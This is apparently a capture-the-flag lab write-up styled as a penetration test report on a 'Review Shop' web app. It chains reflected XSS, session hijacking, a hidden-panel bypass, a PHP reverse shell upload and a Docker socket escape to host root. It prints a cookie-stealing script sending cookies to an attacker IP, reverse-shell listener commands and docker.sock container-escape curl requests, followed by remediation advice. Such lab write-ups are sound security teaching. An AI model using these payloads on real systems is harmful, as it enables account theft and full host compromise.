Web Application Penetration Test Report — Review Shop

Author: Marwan
Date: 2025
Assessment Type: Web Application Penetration Test
Impact: ⭐ Full System Compromise

1. Executive Summary

During the penetration test of the Review Shop web application, multiple vulnerabilities were discovered and chained together, ultimately resulting in full compromise of the host system.

The most notable finding is how a low-impact Reflected XSS escalated through:

Session Hijacking

Social Engineering

Authentication Bypass

File Upload Bypass → RCE

Docker Socket Abuse → Host Escape

This attack path represents a complete kill-chain compromise.

2. Scope
Item	Details
Target	review.thm
IP	10.10.x.x
Services	HTTP (80), SSH (22)
3. Initial Reconnaissance
3.1 Nmap Scan
nmap -p- -vv -A -T3 -oA res review.thm


Findings:

Apache HTTP 2.4.41

PHP session cookie missing HttpOnly

Directory listing disabled

Suspicious upload endpoint

4. Directory Enumeration
gobuster dir -w /usr/share/wordlists/dirb/big.txt \
-u http://review.thm/ -x .php,.php.bak,.txt,.html


Key Findings:

/upload.php

/mails/ — contained developer email dump

4.1 Sensitive Email Leak

The dump revealed:

Internal hidden panels:

/finance.php (on internal 192.x network)

/lottery.php

Password hint: S6***5j

This information became crucial for privilege escalation.

5. Exploiting Reflected XSS — Moderator Compromise

Vulnerability was found in the Contact page.

Payload:
<script>
var img = new Image();
img.src = 'http://10.10.47.10:8888/stealcookies?' + document.cookie;
</script>

Listener:
python3 -m http.server 8888


Captured moderator cookies:

PHPSESSID=d4e4dank4fm26823il0af6vj76
PHPSESSID=4osi19v6cbcl7f4gget27mm5j7
PHPSESSID=mo07n1d44tetqmtrcknl6ge0ko


This provided moderator access.

6. Social Engineering → Admin Session Hijack

The moderator panel exposed a chat with an Admin.

Since XSS was sanitized, a social engineering link was sent:

http://review.thm/admin_view.php


The admin opened the link (while authenticated), triggering the earlier XSS payload from the feedback page.

Captured Admin Cookie:

PHPSESSID=391d5nla1dual6sjnbj10v4f1b


Result: Full Admin Privileges

7. Accessing Hidden Internal Panels

Admin dashboard referenced:

/lottery.php


Using Burp Suite the request was modified:

Original
GET /lottery.php

Modified
GET /finance.php


This bypass exposed the finance panel containing file upload functionality.

8. File Upload Bypass → RCE

Several bypasses were tested:

Image polyglot

Double extensions

Hidden payload inside image metadata

A modified PentestMonkey PHP reverse shell was used:

$ip = '10.10.47.10';
$port = 9001;


Listener:

nc -lvnp 9001


Success:
👉 Code execution inside a Docker container.

9. Privilege Escalation — Docker Escape

The container could write to:

/var/run/docker.sock


This allows full Docker control.

Enumerate Docker images
curl --unix-socket /var/run/docker.sock http://localhost/images/json

Create Privileged Container
curl -X POST --unix-socket /var/run/docker.sock \
-H "Content-Type: application/json" \
-d '{
     "Image":"php:8.1-cli",
     "Cmd":["/bin/sh"],
     "Tty":true,
     "HostConfig":{
        "Privileged":true,
        "Binds":["/:/host"]
     }
}' \
http://localhost/containers/create

Start Container
curl -X POST --unix-socket /var/run/docker.sock \
http://localhost/containers/<ID>/start

Escape to Host
docker exec -it <ID> chroot /host /bin/bash

10. Full Host Compromise

Navigating to /root/ revealed:

THM{roo*******D0n}


This confirms complete host takeover.

11. Root Cause Analysis
Category	Issue	Impact
Client-side	Reflected XSS	Session hijacking
Authentication	No HttpOnly on cookies	Credential theft
Information Disclosure	Email dump in /mails	Internal panel discovery
Access Control	IDOR (lottery → finance)	Hidden panel access
File Upload	No validation	RCE
Docker Security	Writable docker.sock	Full host compromise
12. Recommendations
12.1 Input Validation

Sanitize all inputs server-side

Apply proper HTML escaping

Block <script> payloads

12.2 Session Security

Add HttpOnly, Secure, SameSite=Strict

Regenerate sessions on privilege change

12.3 Protect Sensitive Files

Move logs outside webroot

Apply strict file permissions

12.4 Fix Access Control

Implement RBAC

Validate user roles per endpoint

12.5 Secure File Uploads

Validate MIME + magic bytes

Use safe upload directories

Block PHP execution in uploads

12.6 Docker Hardening

Never expose docker.sock

Disable Privileged containers

Use AppArmor/SELinux profiles

12.7 Logging

Log:

Suspicious uploads

Admin panel access

Docker container creation events

13. Conclusion

This assessment demonstrates how a single low-risk XSS escalated into a critical full system compromise when combined with:

Poor session security

Weak access control

Insecure file uploads

Misconfigured Docker environment

The final impact represents a complete kill-chain, ending with root access over the host system.
